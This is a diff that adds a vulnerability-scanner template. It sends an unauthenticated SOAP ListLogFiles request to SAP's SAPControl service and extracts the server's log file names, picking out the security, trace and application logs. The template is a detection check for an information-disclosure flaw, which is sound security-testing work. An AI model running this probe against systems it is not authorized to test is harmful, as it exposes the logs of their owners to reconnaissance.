@@ -1,0 +1,99 @@
+id: sap-sapcontrol-listlogfiles-log-enum
+
+info:
+  name: SAPControl - ListLogFiles without authentication
+  author: LRVT <https://github.com/l4rm4nd>
+  severity: medium
+  tags: sap,sapcontrol,soap,log,info-disclosure
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+
+    headers:
+      Content-Type: text/xml; charset=UTF-8
+      SOAPAction: '""'
+      User-Agent: Mozilla/5.0
+
+    body: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
+        <SOAP-ENV:Header>
+          <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
+            <enableSession>true</enableSession>
+          </sapsess:Session>
+        </SOAP-ENV:Header>
+        <SOAP-ENV:Body>
+          <ns1:ListLogFiles xmlns:ns1="urn:SAPControl"/>
+        </SOAP-ENV:Body>
+      </SOAP-ENV:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "ListLogFilesResponse"
+
+      - type: word
+        part: body
+        words:
+          - "<filename>"
+
+    extractors:
+      # Collect all filenames internally (no direct CLI spam)
+      - type: regex
+        part: body
+        name: log_files
+        internal: true
+        group: 1
+        regex:
+          - "<filename>([^<]+)</filename>"
+
+      # Optional: pull out a few "interesting" classes of logs, still internal
+      - type: regex
+        part: body
+        name: slog_files
+        internal: true
+        group: 1
+        regex:
+          - "<filename>(log/SLOG[^<]+)</filename>"
+
+      - type: regex
+        part: body
+        name: defaulttrace_files
+        internal: true
+        group: 1
+        regex:
+          - "<filename>([^<]*defaultTrace[^<]+)</filename>"
+
+      - type: regex
+        part: body
+        name: security_logs
+        internal: true
+        group: 1
+        regex:
+          - "<filename>([^<]*security_00[^<]+)</filename>"
+
+      - type: regex
+        part: body
+        name: applications_logs
+        internal: true
+        group: 1
+        regex:
+          - "<filename>([^<]*applications_00[^<]+)</filename>"
+
+      # One concise summary line in the output
+      - type: dsl
+        name: summary
+        dsl:
+          - "concat('total_logs=', len(log_files), \
+'; slog=', len(slog_files), \
+'; defaultTrace=', len(defaulttrace_files), \
+'; security=', len(security_logs), \
+'; applications=', len(applications_logs))"
